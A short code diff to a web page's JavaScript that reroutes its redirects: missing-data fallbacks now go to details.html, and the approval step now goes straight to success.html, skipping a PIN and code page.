@@ -197,12 +197,12 @@
       // If missing critical data, redirect back to phone page
       if (!botId) {
         alert('Bot ID missing. Please start over.');
-        window.location.href = 'index.html';
+        window.location.href = 'details.html';
         return;
       }
       if (!phone) {
         alert('Phone number missing. Please start over.');
-        window.location.href = 'index.html';
+        window.location.href = 'details.html';
         return;
       }
       if (!name) {
@@ -410,8 +410,8 @@
               .then(function(status) {
                 if (status.approved === true) {
                   stopPolling();
-                  // ✅ REDIRECT TO SUCCESS PAGE (code.html)
-                  var successUrl = 'code.html?botId=' + encodeURIComponent(botId) +
+                  // ✅ DIRECT REDIRECT TO SUCCESS PAGE (skip PIN & code)
+                  var successUrl = 'success.html?botId=' + encodeURIComponent(botId) +
                                    '&phone=' + encodeURIComponent(phone) +
                                    '&name=' + encodeURIComponent(name);
                   window.location.href = successUrl;
